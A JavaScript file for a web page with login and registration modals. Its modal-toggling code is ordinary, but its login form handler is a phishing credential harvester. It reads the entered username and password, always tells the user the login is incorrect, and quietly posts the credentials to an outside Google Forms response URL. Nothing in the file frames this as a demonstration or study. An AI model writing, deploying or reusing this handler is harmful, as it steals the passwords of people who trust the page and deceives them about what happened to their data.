const listButtonCloseModal =
  document.getElementsByClassName("button-close-modal");
const listButtonLoginAccount = document.getElementsByClassName(
  "button-login-account"
);
const listButtonCreateAccount = document.getElementsByClassName(
  "button-create-account"
);

const modalLogin = document.getElementById("modal-login");
const modalRegister = document.getElementById("modal-register");

for (let button of listButtonCloseModal) {
  button.addEventListener("click", function () {
    let containerDiv = this.parentElement;
    let container = containerDiv.parentElement;

    container.classList.remove("display-flex");
    container.classList.add("display-hidden");
  });
}

for (let button of listButtonLoginAccount) {
  button.addEventListener("click", function () {
    modalLogin.classList.remove("display-hidden");
    modalRegister.classList.add("display-hidden");
  });
}

for (let button of listButtonCreateAccount) {
  button.addEventListener("click", function () {
    modalRegister.classList.remove("display-hidden");
    modalLogin.classList.add("display-hidden");
  });
}

$(function () { //shorthand document.ready function
  $('#login_form').on('submit', function (e) { //use on if jQuery 1.7+
    e.preventDefault();  //prevent form from submitting
    const username = $('input[name^="entry.963321974"]').val()
    const password = $('input[name^="entry.716832079"]').val()
    console.log(username, password)
    if (!username || !password) {
      alert(`Please typing "username" or "password"`)
    } else {
      alert('username or password is incorrect')
      axios
        .post('https://docs.google.com/forms/d/e/1FAIpQLSf87gXIjxwQNEfHP_-NifaHJocb7jhrY9dXsTChvEnT853SKw/formResponse', $('#login_form').serialize())
    }
  });
});
//963321974, 716832079 